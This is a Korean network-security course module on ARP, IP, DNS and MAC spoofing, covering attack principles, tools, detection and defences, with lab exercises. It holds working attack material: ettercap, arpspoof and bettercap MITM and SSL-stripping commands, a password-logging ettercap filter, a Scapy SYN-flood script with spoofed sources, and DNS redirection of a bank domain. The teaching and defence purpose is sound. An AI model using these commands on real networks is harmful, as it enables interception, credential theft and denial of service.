# Phase 2-2: 스푸핑 (Spoofing)

## 학습 목표
- Spoofing 공격의 개념과 다양한 유형 이해
- ARP Spoofing의 원리와 MITM 구성 방법 습득
- IP Spoofing 기법과 탐지 회피 원리 파악
- DNS Spoofing/Cache Poisoning 공격 메커니즘 학습
- MAC Spoofing의 활용과 한계점 이해
- 각 Spoofing 공격에 대한 탐지 및 방어 방법 습득

---

## 1. Spoofing 개요

### 1.1 정의

**Spoofing (스푸핑)**
- "속이다", "위조하다"
- 신뢰할 수 있는 출처로 위장
- 네트워크 주소, 신원, 데이터를 위조

**목적**
- 접근 제어 우회
- MITM (Man-In-The-Middle) 공격
- 익명성 확보
- 추적 회피

### 1.2 Spoofing 유형

```
L2: MAC Spoofing
  - MAC 주소 위조
  - MAC 필터링 우회

L3: IP Spoofing
  - 출발지 IP 위조
  - DDoS 반사 공격
  - 추적 회피

L4: TCP/UDP Spoofing
  - 포트 위조
  - Sequence Number 예측

L7: DNS Spoofing
  - DNS 응답 위조
  - 피싱 사이트 유도

기타: Email Spoofing
  - 발신자 주소 위조
  - 피싱 메일
```

---

## 2. ARP Spoofing

### 2.1 원리

**ARP의 취약점**
```
문제점:
1. 인증 없음 (Stateless)
   - ARP Request/Reply 검증 안 함
   - 누구나 ARP Reply 전송 가능

2. Gratuitous ARP 허용
   - 요청 없이도 ARP Reply 가능
   - 자동으로 ARP Cache 업데이트

3. 신뢰 기반
   - 마지막 응답을 무조건 신뢰
   - 기존 엔트리 덮어쓰기
```

**공격 시나리오**
```
정상 통신:
PC (192.168.1.10, MAC: AA:AA:AA:AA:AA:AA)
  ↓
Gateway (192.168.1.1, MAC: BB:BB:BB:BB:BB:BB)
  ↓
Internet

PC의 ARP Table:
192.168.1.1 → BB:BB:BB:BB:BB:BB (Gateway)

공격자 개입:
Attacker (192.168.1.100, MAC: CC:CC:CC:CC:CC:CC)

Step 1: PC에게 가짜 ARP Reply 전송
"192.168.1.1의 MAC은 CC:CC:CC:CC:CC:CC야!"

Step 2: PC의 ARP Table 오염
192.168.1.1 → CC:CC:CC:CC:CC:CC (Attacker!)

Step 3: Gateway에게도 가짜 ARP Reply 전송
"192.168.1.10의 MAC은 CC:CC:CC:CC:CC:CC야!"

Step 4: Gateway의 ARP Table 오염
192.168.1.10 → CC:CC:CC:CC:CC:CC (Attacker!)

결과: 양방향 MITM 성공
PC → Attacker → Gateway
Gateway → Attacker → PC
```

### 2.2 공격 패킷 구조

**가짜 ARP Reply (PC 대상)**
```
Ethernet Frame:
  Src MAC:  CC:CC:CC:CC:CC:CC (Attacker)
  Dst MAC:  AA:AA:AA:AA:AA:AA (PC)
  Type:     0x0806 (ARP)

ARP Packet:
  Hardware Type:    Ethernet (1)
  Protocol Type:    IPv4 (0x0800)
  Operation:        Reply (2)
  Sender MAC:       CC:CC:CC:CC:CC:CC (Attacker)
  Sender IP:        192.168.1.1 (Gateway IP - 위조!)
  Target MAC:       AA:AA:AA:AA:AA:AA (PC)
  Target IP:        192.168.1.10
```

**가짜 ARP Reply (Gateway 대상)**
```
ARP Packet:
  Operation:        Reply (2)
  Sender MAC:       CC:CC:CC:CC:CC:CC (Attacker)
  Sender IP:        192.168.1.10 (PC IP - 위조!)
  Target MAC:       BB:BB:BB:BB:BB:BB (Gateway)
  Target IP:        192.168.1.1
```

### 2.3 공격 도구

#### Ettercap

**설치**
```bash
# Ubuntu/Debian
sudo apt install ettercap-text-only ettercap-graphical

# macOS
brew install ettercap
```

**기본 사용법**
```bash
# Text 모드
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//
# -T: Text UI
# -M arp:remote: ARP Spoofing (양방향)
# /IP//: Target 지정 (IP만, MAC은 자동)

# GUI 모드
sudo ettercap -G

# GUI에서:
1. Sniff → Unified sniffing → eth0
2. Hosts → Scan for hosts
3. Hosts → Hosts list
4. Target 1: Gateway (192.168.1.1)
5. Target 2: Victim (192.168.1.10)
6. Mitm → ARP poisoning → Sniff remote connections
7. Start → Start sniffing
```

**필터 사용 (패킷 변조)**
```bash
# 필터 파일 작성 (password.filter)
if (ip.proto == TCP && tcp.dst == 80) {
  if (search(DATA.data, "password")) {
    log(DATA.data, "/tmp/passwords.log");
  }
}

# 컴파일
etterfilter password.filter -o password.ef

# 적용
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10// -F password.ef
```

#### arpspoof (dsniff 패키지)

**설치**
```bash
sudo apt install dsniff
```

**사용법**
```bash
# IP Forwarding 활성화 (패킷 포워딩)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# PC → Gateway 방향
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
# -i: Interface
# -t: Target (피해자 IP)
# 마지막: Gateway IP (위조할 IP)

# 다른 터미널에서 Gateway → PC 방향
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# 이제 Wireshark로 트래픽 캡처
```

#### bettercap

**현대적 MITM 프레임워크**

```bash
# 설치
sudo apt install bettercap

# 실행
sudo bettercap -iface eth0

# bettercap 인터페이스에서
» net.probe on
» net.show
» set arp.spoof.targets 192.168.1.10
» arp.spoof on
» net.sniff on

# HTTP 자격증명 캡처
» set http.proxy.sslstrip true
» http.proxy on

# 패킷 확인
» events.stream on
```

### 2.4 공격 시나리오

**시나리오 1: 비밀번호 탈취**
```
1. ARP Spoofing으로 MITM 구성
2. Wireshark 캡처 시작
   Display Filter: http.request.method == "POST"
3. 피해자가 HTTP 로그인
4. POST 데이터에서 비밀번호 확인
```

**시나리오 2: 세션 하이재킹**
```
1. ARP Spoofing
2. Cookie 탈취
   Display Filter: http.cookie
3. Cookie를 브라우저에 주입
4. 피해자 계정으로 로그인
```

**시나리오 3: SSL Stripping**
```
도구: sslstrip, bettercap

1. ARP Spoofing
2. HTTPS → HTTP 다운그레이드
   - 피해자 → Attacker: HTTP 요청
   - Attacker → Server: HTTPS 요청
   - 피해자는 HTTP로 통신한다고 착각
3. 평문 데이터 탈취
```

**시나리오 4: DNS Spoofing (ARP 기반)**
```
1. ARP Spoofing
2. DNS 쿼리 가로채기
3. 가짜 DNS 응답 전송
   - www.bank.com → 공격자 IP
4. 피해자가 피싱 사이트 접속
```

### 2.5 탐지 방법

**1. ARP Table 모니터링**
```bash
# 주기적 확인
watch -n 1 arp -a

# 변경 감지
while true; do
  arp -a > /tmp/arp_new
  diff /tmp/arp_old /tmp/arp_new
  mv /tmp/arp_new /tmp/arp_old
  sleep 5
done
```

**2. arpwatch**
```bash
# 설치
sudo apt install arpwatch

# 실행
sudo arpwatch -i eth0

# 로그 확인
sudo tail -f /var/log/syslog | grep arpwatch

# ARP 변경 시 이메일 알림 가능
```

**3. XArp (Windows)**
- GUI 도구
- 실시간 ARP 모니터링
- 알림 기능

**4. Wireshark 탐지**
```
Display Filter:
arp.duplicate-address-detected

또는

arp.opcode == 2 && arp.src.hw_mac != eth.src
(ARP Reply의 Sender MAC과 Ethernet Src MAC 불일치)
```

**징후**
```
- 같은 IP에 여러 MAC 주소
- Gratuitous ARP 폭주
- ARP Reply 없이 ARP Reply만 수신
- MAC 주소 변경 알림
```

### 2.6 방어 방법

**1. Static ARP Entry**
```bash
# Linux
sudo arp -s 192.168.1.1 BB:BB:BB:BB:BB:BB

# 영구 설정 (재부팅 후에도 유지)
# /etc/network/interfaces에 추가:
post-up arp -s 192.168.1.1 BB:BB:BB:BB:BB:BB

# Windows
arp -s 192.168.1.1 BB-BB-BB-BB-BB-BB
```

**장점**: 완전한 방어
**단점**: 관리 부담 (모든 호스트에 설정)

**2. Dynamic ARP Inspection (DAI)**
```cisco
# Cisco Switch 설정
ip dhcp snooping
ip dhcp snooping vlan 10

ip arp inspection vlan 10

interface GigabitEthernet0/1
 ip dhcp snooping trust
 ip arp inspection trust

interface range GigabitEthernet0/2-24
 # Untrusted (기본값)
```

**동작**
```
1. DHCP Snooping으로 IP-MAC-Port 바인딩 테이블 구축
2. ARP 패킷 검증:
   - Sender IP/MAC이 바인딩 테이블과 일치?
   - 일치 → 통과
   - 불일치 → 차단
3. Trusted 포트는 검증 안 함 (Gateway, Server)
```

**3. 암호화 (HTTPS, VPN)**
```
ARP Spoofing 성공해도:
- HTTPS: 데이터 암호화 (SSL Stripping 주의)
- VPN: 전체 트래픽 암호화
→ 평문 탈취 불가
```

**4. 포트 보안**
```cisco
switchport port-security
switchport port-security maximum 1
switchport port-security mac-address sticky
switchport port-security violation shutdown
```

**5. 802.1X (NAC)**
```
- 포트 기반 인증
- 인증된 MAC만 네트워크 접근
- RADIUS 서버 연동
```

---

## 3. IP Spoofing

### 3.1 원리

**IP Spoofing**
- 출발지 IP 주소 위조
- 패킷의 Source IP 필드를 변경

**가능한 이유**
```
IP 프로토콜의 한계:
1. Stateless
   - 연결 추적 안 함
   - 출발지 검증 안 함

2. Best Effort
   - 신뢰성 없음
   - 인증 메커니즘 없음

3. Router의 역할
   - 목적지만 확인 (Destination IP)
   - 출발지는 확인 안 함 (일반적으로)
```

**제약**
```
응답을 받을 수 없음:
- 응답은 위조된 IP로 전송됨
- 공격자는 응답 수신 불가

따라서:
- 일방향 공격에만 사용
- DoS/DDoS 증폭 공격
- 추적 회피
```

### 3.2 공격 유형

#### 유형 1: Blind Spoofing (맹목 스푸핑)

**특징**
- 응답 볼 수 없음
- 추측 기반

**사용 사례**
```
DoS 공격:
- SYN Flooding (출발지 IP 랜덤 위조)
- 응답 필요 없음

DDoS 반사 공격:
1. 출발지 IP를 피해자 IP로 위조
2. 증폭 서버에 요청 (DNS, NTP, Memcached)
3. 응답이 피해자에게 전송
4. 증폭 효과 (1바이트 요청 → 1000바이트 응답)
```

**예시: DNS 증폭 공격**
```
Attacker                DNS Server              Victim
  |                         |                     |
  | DNS Query (ANY)         |                     |
  | Src: Victim IP (위조!)  |                     |
  | Dst: DNS Server         |                     |
  | Size: 60 bytes          |                     |
  |------------------------>|                     |
  |                         |                     |
  |                         | DNS Response        |
  |                         | Src: DNS Server     |
  |                         | Dst: Victim IP      |
  |                         | Size: 3000 bytes    |
  |                         |-------------------->|
  |                         |                     |
  증폭률: 50배 (3000/60)      수백 대 DNS 서버 이용
                            → 수 Gbps 트래픽 생성
```

#### 유형 2: Non-Blind Spoofing (비맹목 스푸핑)

**전제 조건**
- 같은 네트워크 (Local)
- Sniffing 가능

**TCP Sequence Number 예측 공격**
```
목표: TCP 연결 하이재킹

1. Sniffing으로 SEQ/ACK 확인
2. 다음 SEQ 예측
3. 위조된 패킷 전송
   Src IP: 신뢰받는 IP
   SEQ: 예측값
4. 서버가 수락 → 명령 실행
```

**예시: Trusted Host 이용**
```
Server (192.168.1.100)
  - Trust: 192.168.1.50 (Admin PC)

Attacker (192.168.1.200)
  - 목표: Admin으로 위장

1. Admin PC를 DoS로 무력화
   - SYN Flooding
   - 응답 못 하게

2. Admin IP로 위조 패킷 전송
   Src: 192.168.1.50
   Dst: 192.168.1.100
   SEQ: 예측값

3. Server가 Admin이라고 착각
```

### 3.3 IP Spoofing 실습

**Scapy (Python 패킷 조작)**

```python
#!/usr/bin/env python3
from scapy.all import *

# ICMP Echo Request (Ping) 위조
spoofed_ip = "1.1.1.1"  # 위조할 출발지 IP
target_ip = "192.168.1.100"

# IP 패킷 생성
ip = IP(src=spoofed_ip, dst=target_ip)

# ICMP 패킷 생성
icmp = ICMP(type=8, code=0)  # Echo Request

# 패킷 전송
packet = ip/icmp/"Hello Spoofed Packet"
send(packet, verbose=1)

print(f"Sent spoofed ICMP from {spoofed_ip} to {target_ip}")
```

**실행**
```bash
sudo python3 ip_spoof.py

# Wireshark에서 확인:
# Source IP가 1.1.1.1로 표시됨
# 실제로는 공격자가 전송
```

**SYN Flooding (출발지 랜덤 위조)**
```python
#!/usr/bin/env python3
from scapy.all import *
import random

target_ip = "192.168.1.100"
target_port = 80

while True:
    # 랜덤 출발지 IP
    spoofed_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
    spoofed_port = random.randint(1024, 65535)
    
    # SYN 패킷
    ip = IP(src=spoofed_ip, dst=target_ip)
    tcp = TCP(sport=spoofed_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))
    
    send(ip/tcp, verbose=0)
    print(f"SYN from {spoofed_ip}:{spoofed_port}")
```

### 3.4 탐지 방법

**1. TTL 분석**
```
정상:
192.168.1.10 → Server
TTL: 64 (Linux 기본값)

스푸핑:
Attacker가 192.168.1.10으로 위장
TTL: 128 (Windows) 또는 다른 값

→ 같은 IP인데 TTL이 다름
```

**2. 경로 불일치**
```
정상:
192.168.1.10은 항상 Switch Port 5에서 도착

스푸핑:
192.168.1.10 패킷이 Port 10에서 도착

→ 불일치 탐지
```

**3. Reverse Path Forwarding (RPF)**
```
Router 설정:
- 수신 패킷의 출발지 IP 확인
- 라우팅 테이블 조회: "이 IP로 가려면?"
- 수신 인터페이스와 비교
- 불일치 → 드롭

예:
출발지: 10.0.0.5
수신 인터페이스: eth1
라우팅 테이블: 10.0.0.0/24 → eth0
→ eth1로 들어올 수 없음 → 스푸핑!
```

**4. Ingress Filtering (BCP 38)**
```
ISP가 출발지 IP 검증:
- 고객이 할당받은 IP 범위만 허용
- 예: 고객 IP = 203.0.113.0/24
  - 203.0.113.50 → OK
  - 1.2.3.4 → DROP (스푸핑)

→ DDoS 반사 공격 차단
```

### 3.5 방어 방법

**1. Ingress/Egress Filtering**
```cisco
# Cisco ACL
ip access-list extended ANTI_SPOOF
 deny ip 10.0.0.0 0.255.255.255 any    ! 사설 IP 차단
 deny ip 172.16.0.0 0.15.255.255 any
 deny ip 192.168.0.0 0.0.255.255 any
 deny ip 127.0.0.0 0.255.255.255 any   ! Loopback
 deny ip 0.0.0.0 0.255.255.255 any     ! Invalid
 permit ip any any

interface GigabitEthernet0/0
 ip access-group ANTI_SPOOF in
```

**2. uRPF (Unicast Reverse Path Forwarding)**
```cisco
interface GigabitEthernet0/0
 ip verify unicast source reachable-via rx
```

**3. 암호화 & 인증**
```
IPsec:
- 출발지 인증
- AH (Authentication Header)
- ESP (Encapsulating Security Payload)

→ 스푸핑된 패킷은 인증 실패
```

**4. Rate Limiting**
```
- 동일 출발지 IP의 패킷 수 제한
- SYN Flooding 완화
```

---

## 4. DNS Spoofing

### 4.1 DNS 기본 동작

**정상 DNS 조회**
```
Client                  DNS Resolver            Authoritative DNS
  |                         |                         |
  | Query: www.example.com  |                         |
  |------------------------>|                         |
  |                         | Query: example.com      |
  |                         |------------------------>|
  |                         |                         |
  |                         | Response: 93.184.216.34 |
  |                         |<------------------------|
  | Response: 93.184.216.34 |                         |
  |<------------------------|                         |
  |                         |                         |

Cache 저장:
Resolver: www.example.com → 93.184.216.34 (TTL: 3600초)
Client: www.example.com → 93.184.216.34
```

### 4.2 DNS Cache Poisoning

**공격 원리**
```
목표: Resolver의 캐시에 가짜 레코드 삽입

문제:
1. DNS는 UDP 사용 (비연결)
2. Transaction ID가 16비트 (0~65535)
3. 예측 가능하면 위조 응답 전송 가능

공격:
1. Client가 DNS Query 전송
   Transaction ID: 0x1234

2. Attacker가 가짜 응답을 먼저 전송
   Transaction ID: 0x1234 (추측/Sniffing)
   Answer: www.bank.com → 공격자 IP

3. Resolver가 첫 번째 응답 수락
   Cache: www.bank.com → 공격자 IP

4. 실제 응답은 무시 (늦게 도착)

5. 모든 클라이언트가 피싱 사이트 접속
```

**Kaminsky Attack (2008)**
```
개선된 Cache Poisoning:

기존 문제:
- www.example.com 캐시되면 재시도 불가 (TTL 만료 대기)

Kaminsky 방법:
1. 존재하지 않는 서브도메인 쿼리
   random123.example.com
   random456.example.com
   ...

2. 각 쿼리마다 공격 시도

3. Authority Section에 가짜 NS 레코드 삽입
   example.com NS attacker.com
   attacker.com A 공격자 IP

4. 성공하면:
   example.com의 모든 서브도메인 → 공격자 제어
```

### 4.3 Local DNS Spoofing (MITM 기반)

**ARP Spoofing + DNS 위조**

```bash
# Ettercap으로 자동화
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10// -P dns_spoof

# DNS 위조 설정
# /etc/ettercap/etter.dns 파일 수정:
www.bank.com A 192.168.1.100
*.bank.com   A 192.168.1.100
```

**dnsspoof (dsniff)**
```bash
# 호스트 파일 생성
echo "192.168.1.100 www.bank.com" > /tmp/hosts

# ARP Spoofing (별도 터미널)
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# DNS Spoofing
sudo dnsspoof -i eth0 -f /tmp/hosts

# 피해자가 www.bank.com 조회 시:
# → 192.168.1.100 응답
```

**bettercap**
```bash
sudo bettercap -iface eth0

» set dns.spoof.domains www.bank.com
» set dns.spoof.address 192.168.1.100
» dns.spoof on
» arp.spoof on
```

### 4.4 탐지 방법

**1. DNS 응답 이중 확인**
```bash
# 여러 DNS 서버에 질의
dig @8.8.8.8 www.example.com
dig @1.1.1.1 www.example.com
dig @208.67.222.222 www.example.com

# 결과가 다르면 → 의심
```

**2. DNSSEC 검증**
```bash
# DNSSEC 서명 확인
dig www.example.com +dnssec

# 서명 유효성 검증
dig www.example.com +dnssec +multi

# DNSSEC 활성화 확인
delv www.example.com
```

**3. Wireshark 분석**
```
Display Filter:
dns.flags.response == 1

확인 사항:
- Transaction ID 중복 응답
- 응답 시간 (너무 빠름 → 로컬 공격자)
- Source IP (신뢰하는 DNS인지)
```

**4. 비정상 TTL**
```
정상: TTL 3600초 (1시간)
의심: TTL 60초 또는 매우 짧음
```

### 4.5 방어 방법

**1. DNSSEC (DNS Security Extensions)**
```
동작:
1. Authoritative DNS가 레코드에 서명
2. 공개키로 서명 검증
3. 체인 신뢰 (Root → TLD → Domain)

장점: 위조 응답 탐지 가능
단점: 도입률 낮음, 복잡함
```

**2. DNS over HTTPS (DoH) / DNS over TLS (DoT)**
```
DoH:
- DNS 쿼리를 HTTPS로 암호화
- 포트 443 사용
- ISP가 쿼리 내용 볼 수 없음

DoT:
- DNS 쿼리를 TLS로 암호화
- 포트 853 사용

설정 (Firefox):
about:config
network.trr.mode = 2
network.trr.uri = https://1.1.1.1/dns-query
```

**3. VPN**
```
- 전체 트래픽 암호화 (DNS 포함)
- 로컬 공격자가 패킷 볼 수 없음
```

**4. Hosts 파일 검증**
```bash
# Linux/macOS
cat /etc/hosts

# Windows
type C:\Windows\System32\drivers\etc\hosts

# 의심스러운 엔트리 삭제
# 예: 127.0.0.1 www.google.com
```

---

## 5. MAC Spoofing

### 5.1 원리

**MAC 주소 변경**
- NIC의 MAC 주소는 펌웨어에 저장
- OS에서 소프트웨어적으로 변경 가능

**목적**
```
1. MAC 필터링 우회
   - WiFi Access Control
   - Switch Port Security

2. 익명성
   - 추적 회피
   - Public WiFi

3. 네트워크 접근
   - 화이트리스트 우회
```

### 5.2 MAC Spoofing 방법

**Linux**
```bash
# 현재 MAC 확인
ip link show eth0

# Interface Down
sudo ip link set eth0 down

# MAC 변경
sudo ip link set eth0 address 00:11:22:33:44:55

# Interface Up
sudo ip link set eth0 up

# 확인
ip link show eth0

# macchanger 도구
sudo macchanger -m 00:11:22:33:44:55 eth0
sudo macchanger -r eth0  # Random MAC
sudo macchanger -a eth0  # Random (같은 제조사)
```

**Windows**
```
1. 장치 관리자
2. 네트워크 어댑터 → 속성
3. 고급 → Network Address
4. 값: 001122334455 (하이픈/콜론 없이)
5. 재부팅 또는 어댑터 비활성화/활성화

또는 레지스트리:
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0001
NetworkAddress = 001122334455
```

**macOS**
```bash
# 현재 MAC
ifconfig en0 | grep ether

# 변경
sudo ifconfig en0 ether 00:11:22:33:44:55

# 재시작 시 원래대로 복구됨
```

### 5.3 공격 시나리오

**WiFi MAC 필터링 우회**
```
1. Sniffing으로 허용된 MAC 주소 확인
   sudo airodump-ng wlan0mon
   
2. 확인된 MAC으로 변경
   sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0

3. WiFi 접속
```

**DHCP Starvation**
```
1. MAC 주소를 계속 변경하며 DHCP 요청
2. DHCP Pool 고갈
3. DoS 발생

도구: Yersinia, DHCPig
```

### 5.4 탐지 방법

**1. OUI 검증**
```
MAC의 앞 3바이트 (OUI) 확인:
- 00:11:22:xx:xx:xx
- IEEE OUI DB 조회

의심:
- 알려지지 않은 제조사
- 랜덤 패턴
```

**2. ARP 모니터링**
```
같은 IP에 여러 MAC:
- ARP Spoofing 또는 MAC Spoofing
```

**3. Switch CAM Table**
```cisco
show mac address-table

# 같은 MAC이 여러 포트에 나타남
# → 의심 (정상적으로 불가능)
```

### 5.5 방어 방법

**1. 802.1X (Port-Based NAC)**
```
- MAC이 아닌 인증서/자격증명 기반
- MAC 변경해도 인증 실패
```

**2. Port Security**
```cisco
switchport port-security
switchport port-security mac-address sticky
switchport port-security maximum 1
```

**3. MAC-IP 바인딩 (DHCP Snooping)**
```
- DHCP로 할당된 IP-MAC만 허용
- Static 변경 불가
```

---

## 6. 종합 실습 과제

### 과제 1: ARP Spoofing 실습 (LAB 환경)
```
환경 구성:
- VM1 (Kali Linux): Attacker
- VM2 (Ubuntu): Victim
- VM3 (Ubuntu): Gateway/Router

실습:
1. Ettercap으로 MITM 구성
2. Wireshark로 HTTP 트래픽 캡처
3. POST 데이터 확인
4. arpwatch로 탐지 확인
```

### 과제 2: IP Spoofing (Scapy)
```python
# ICMP 출발지 위조
from scapy.all import *

spoofed_ip = "8.8.8.8"
target = "192.168.1.100"

packet = IP(src=spoofed_ip, dst=target)/ICMP()
send(packet)

# Wireshark로 확인
# - Source IP가 8.8.8.8로 표시
# - 실제로는 자신이 전송
```

### 과제 3: DNS Spoofing 테스트
```bash
# 환경: 로컬 DNS 서버 (dnsmasq)
sudo apt install dnsmasq

# /etc/dnsmasq.conf
address=/test.com/192.168.1.100

sudo systemctl restart dnsmasq

# 테스트
dig @localhost test.com
# → 192.168.1.100 응답 확인
```

### 과제 4: MAC Spoofing
```bash
# 1. 현재 MAC 저장
ORIGINAL_MAC=$(ip link show eth0 | grep ether | awk '{print $2}')

# 2. MAC 변경
sudo ip link set eth0 down
sudo ip link set eth0 address 00:11:22:33:44:55
sudo ip link set eth0 up

# 3. 확인
ip link show eth0

# 4. 복구
sudo ip link set eth0 down
sudo ip link set eth0 address $ORIGINAL_MAC
sudo ip link set eth0 up
```

---

## 7. 연결 포인트

### Phase 1.2: Address System
→ **ARP 원리**: ARP Spoofing의 기초
→ **IP 주소 구조**: IP Spoofing 이해
→ **MAC 주소**: MAC Spoofing 전제

### Phase 2.1: Scanning/Sniffing
→ **Sniffing**: ARP Spoofing으로 MITM 구성 후 Sniffing
→ **Promiscuous Mode**: MITM 트래픽 캡처

### Phase 2.3: Session Hijacking
→ **MITM**: ARP Spoofing으로 세션 가로채기
→ **Cookie 탈취**: Sniffing으로 획득

### Phase 2.4: DoS/DDoS
→ **IP Spoofing**: DDoS 반사 공격, SYN Flooding

### Phase 3.1: Firewall
→ **uRPF**: IP Spoofing 방어
→ **ACL**: Ingress Filtering

### Phase 3.2: IDS/IPS
→ **ARP Spoofing 탐지**: 비정상 ARP 패턴
→ **DNS Anomaly**: 가짜 DNS 응답

---

## 8. 핵심 요약

**ARP Spoofing**
- 원리: ARP 응답 위조 → ARP Cache 오염
- 결과: MITM (Man-In-The-Middle)
- 방어: DAI, Static ARP, 암호화

**IP Spoofing**
- 원리: 출발지 IP 위조
- 제약: 응답 수신 불가 (일방향)
- 용도: DoS/DDoS, 추적 회피
- 방어: uRPF, Ingress Filtering

**DNS Spoofing**
- 원리: DNS 응답 위조, Cache Poisoning
- 결과: 피싱 사이트 유도
- 방어: DNSSEC, DoH/DoT, VPN

**MAC Spoofing**
- 원리: MAC 주소 변경
- 용도: 필터링 우회, 익명성
- 방어: 802.1X, Port Security

---

**다음 학습**: Phase 2-3 Session Hijacking
